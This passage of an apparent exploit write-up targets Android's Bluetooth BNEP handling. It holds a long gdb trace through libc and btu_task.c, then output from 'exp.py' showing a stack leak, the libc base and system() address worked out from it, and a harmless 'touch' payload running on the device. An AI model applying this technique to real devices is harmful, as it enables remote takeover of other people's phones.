(gdb) 
0xb4ca6a48 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a4c in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb6f41208 in sigaction ()
(gdb) 
0xb6f4120a in sigaction ()
(gdb) 
0xb6f4120c in sigaction ()
(gdb) 
0xb6f4120e in sigaction ()
(gdb) 
0xb6f41210 in sigaction ()
(gdb) 
0xb6f41212 in sigaction ()
(gdb) 
0xb6f41214 in sigaction ()
(gdb) 
0xb6f41216 in sigaction ()
(gdb) 
0xb6f41218 in sigaction ()
(gdb) 
0xb6f4121a in sigaction ()
(gdb) 
0xb6f4121c in sigaction ()
(gdb) 
0xb6f4121e in sigaction ()
(gdb) 
0xb6f41220 in sigaction ()
(gdb) 
0xb6f41222 in sigaction ()
(gdb) 
0xb6f41224 in sigaction ()
(gdb) 
0xb6f41228 in sigaction ()
(gdb) 
0xb6f4122a in sigaction ()
(gdb) 
0xb6f4122e in sigaction ()
(gdb) 
0xb6f41230 in sigaction ()
(gdb) 
0xb6f41258 in sigaction ()
(gdb) 
0xb6f4125a in sigaction ()
(gdb) 
0xb6f4125c in sigaction ()
(gdb) 
0xb6f4125e in sigaction ()
(gdb) 
0xb6f4126c in sigaction ()
(gdb) 
0xb6f4126e in sigaction ()
(gdb) 
0xb6f41270 in sigaction ()
(gdb) 
0xb6f41272 in sigaction ()
(gdb) 
0xb6f41274 in sigaction ()
(gdb) 
0xb6f41276 in sigaction ()
(gdb) 
0xb6f41278 in sigaction ()
(gdb) 
0xb6f4127a in sigaction ()
(gdb) 
0xb6f4127c in sigaction ()
(gdb) 
0xb6f4127e in sigaction ()
(gdb) 
0xb6f41280 in sigaction ()
(gdb) 
0xb6f41282 in sigaction ()
(gdb) 
0xb6f41286 in sigaction ()
(gdb) 
0xb4cafd70 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd72 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd74 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd76 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd78 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd7c in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd7e in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd80 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd82 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd84 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd86 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd88 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd8a in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd8c in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd90 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd92 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd96 in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb4cafd9a in sigaction () from target:/system/lib/libc.so
(gdb) 


0xb4cafd9e in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb4cafda0 in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb4cafda2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafda6 in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb4cafda8 in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb4cafdac in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb4cafdae in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb4cafdb2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdb4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdb6 in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb4cafdba in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb4cafdbc in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb4cafdbe in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb4cafdc0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4ca732c in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7330 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7334 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4cdb504 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb508 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb50c in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb510 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb514 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb518 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdca in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdcc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdce in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd8 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafddc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdde in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cd8be0 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8be2 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8be4 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8be6 in system () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a44 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a48 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a4c in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb6f41208 in sigaction ()
(gdb) 
0xb6f4120a in sigaction ()
(gdb) 
0xb6f4120c in sigaction ()
(gdb) 
0xb6f4120e in sigaction ()
(gdb) 
0xb6f41210 in sigaction ()
(gdb) 
0xb6f41212 in sigaction ()
(gdb) 
0xb6f41214 in sigaction ()
(gdb) 
0xb6f41216 in sigaction ()
(gdb) 
0xb6f41218 in sigaction ()
(gdb) 
0xb6f4121a in sigaction ()
(gdb) 
0xb6f4121c in sigaction ()
(gdb) 
0xb6f4121e in sigaction ()
(gdb) 
0xb6f41220 in sigaction ()
(gdb) 
0xb6f41222 in sigaction ()
(gdb) 
0xb6f41224 in sigaction ()
(gdb) 
0xb6f41228 in sigaction ()
(gdb) 
0xb6f4122a in sigaction ()
(gdb) 
0xb6f4122e in sigaction ()
(gdb) 
0xb6f41230 in sigaction ()
(gdb) 
0xb6f41258 in sigaction ()
(gdb) 
0xb6f4125a in sigaction ()
(gdb) 
0xb6f4125c in sigaction ()
(gdb) 
0xb6f4125e in sigaction ()
(gdb) 
0xb6f4126c in sigaction ()
(gdb) 
0xb6f4126e in sigaction ()
(gdb) 
0xb6f41270 in sigaction ()
(gdb) 
0xb6f41272 in sigaction ()
(gdb) 
0xb6f41274 in sigaction ()
(gdb) 
0xb6f41276 in sigaction ()
(gdb) 
0xb6f41278 in sigaction ()
(gdb) 
0xb6f4127a in sigaction ()
(gdb) 
0xb6f4127c in sigaction ()
(gdb) 
0xb6f4127e in sigaction ()
(gdb) 
0xb6f41280 in sigaction ()
(gdb) 
0xb6f41282 in sigaction ()
(gdb) 
0xb6f41286 in sigaction ()
(gdb) 
0xb4cafd70 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd72 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd74 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd76 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd78 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd7c in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd7e in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd80 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd82 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd84 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd86 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd88 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd8a in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd8c in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd90 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd92 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd96 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd9a in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd9e in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafda0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafda2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafda6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafda8 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdac in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdae in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdb2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdb4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdb6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdba in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdbc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdbe in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4ca732c in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7330 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7334 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4cdb504 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb508 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb50c in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb510 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb514 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb518 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdca in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdcc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdce in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd8 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafddc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdde in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bea in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bec in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bee in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bf4 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8c08 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8c0a in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8c0c in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8c0e in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8c10 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8c12 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8c14 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8c16 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8c18 in system () from target:/system/lib/libc.so
(gdb) 
btu_check_bt_sleep () at system/bt/stack/./btu/btu_task.c:234
234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xace761fe	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xace76200	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xace76214	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xace76216	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xace7621a	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xace7621c	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xace7621e	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
btu_hci_msg_ready (queue=<optimized out>, context=<optimized out>)
    at system/bt/stack/./btu/btu_task.c:110
110	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xace76222	110	in system/bt/stack/./btu/btu_task.c
(gdb) 
run_reactor (reactor=<optimized out>, iterations=<optimized out>)
    at system/bt/osi/./src/reactor.c:273
273	system/bt/osi/./src/reactor.c: No such file or directory.
(gdb) 


0xace8af88	273	in system/bt/osi/./src/reactor.c
(gdb) 

0xace8af8a	273	in system/bt/osi/./src/reactor.c
(gdb) 

0xace8af8e	273	in system/bt/osi/./src/reactor.c
(gdb) 

0xace8af92	273	in system/bt/osi/./src/reactor.c
(gdb) 
275	in system/bt/osi/./src/reactor.c
(gdb) 

0xace8af9e	275	in system/bt/osi/./src/reactor.c
(gdb) 

0xacd96c10 in pthread_mutex_unlock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 

0xacd96c14 in pthread_mutex_unlock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xacd96c18 in pthread_mutex_unlock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xb4cda51c in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb4cda520 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 

0xb4cda522 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 

0xb4cda524 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 

0xb4cda526 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb4cda528 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) cont
Continuing.

Thread 23 "bt_workqueue" hit Breakpoint 1, btu_hci_msg_process (
    p_msg=<optimized out>) at system/bt/stack/./btu/btu_task.c:122
122	system/bt/stack/./btu/btu_task.c: No such file or directory.
(gdb) cont
Continuing.

```

Execution:

```

python exp.py hci0 84:55:A5:B6:6F:F6 
[*] Pwn attempt 0:
[*] Set hci0 to new rand BDADDR da:f7:c7:a6:25:5f
[◤] Doing stack memeory leak...
00: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 
01: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 
02: 00000000 00000000 00000000 acfc2e58 9a36a2c8 00000018 00000041 ace6fe5d ace7f67d 
03: ace795e1 acfc2e58 a7c61b40 daf7c7a6 0000255f 00000000 b4300500 b4300970 f41d564b 
04: 00000000 9a36a2a8 000003f3 00020001 9a360700 061d5f85 00000007 000f4240 061d5f85 
05: 00000000 00000000 000f4240 acefb960 00000000 00000000 000003e8 0017ba9e 00000000 
06: acefb960 00007530 00000000 acfc1b74 ace9336c 00000000 b2f79378 9a36a308 00000000 
07: 00000001 ace932f8 9a36a2f8 ace8871f 00000066 00000000 b2f79360 b2f79378 00000000 
08: 00000000 00000613 06146580 00000000 00000000 00000000 00000000 00000000 f41d564b 
09: a7c00000 b4300500 00000003 a7c63c20 a7c00000 b4300500 b4300a78 aa5753c8 a7c63c20 
10: acfc2e58 acfc1b74 b4ce7d3b 00000063 aa5753c8 b4300500 00000000 aa5753c8 b4ce7d67 
11: ace700f5 acfac770 00000000 a7c63c20 00000013 b4cf7ad5 00000063 a7c63c20 b4300500 
12: b4300970 a7c4bd80 00000000 00000001 b4ce7001 f41d564b a7c63c20 00000041 00000013 
13: 00000000 00000041 a7c63c20 acfc2e58 acfc1b74 ace6ff91 0000003d a7c63c30 00000000 
14: ace792db a7c0fab4 b4ce7d3b 0000004b aa5753c8 b4300500 00000000 aa5753c8 b4ce7d67 
15: 9a36a4b0 a7c0f820 0000000f a7c4ba80 00000000 b4cf7ad5 0000004b a7c4ba80 aa5753c8 
16: 00000000 9a36a8d8 00000000 9a36a4b0 b4cf7d03 00000000 9a36a4b0 f41d564b 00000008 
17: a7c4bd88 f41d564b a7c0f2e0 a7c4ba80 9a36a8d8 b4cac361 00000001 00000000 a7c0f820 
18: f41d564b 9a36a8d8 ace8b793 f41d564b a7c0f828 00000001 a7c0faa8 9a36a8d8 00000000 
19: 9a36a4b0 a7c0f820 a7c0fab4 ace8af85 00000001 0000003e a7c0faa8 00000000 00000005 
[*] LIBC  0xb4cac361
[*] BT    0xace7f67d
[*] libc_base: 0xb4c04000, bss_base: 0xace00000
[*] system: 0xb4cd8b4d, acl_name: 0xacfb360c
[*] Set hci0 to new rand BDADDR 92:ec:74:88:d9:17
[*] system    0xb4cd8b4d
[*] PAYLOAD "\x17AACCCCM\x8bʹ\x0c6��CCCCM\x8bʹ";
    touch /data/local/tmp/test
    #
[+] Connecting to BNEP again: Done
[+] Pwning...: Done


```

On mobile

```
s3ve3g:/data/local/tmp # ls
apt.conf.owMBvd  apt.data.HdUevr  apt.sig.kv2PHc  test  
s3ve3g:/data/local/tmp #
```
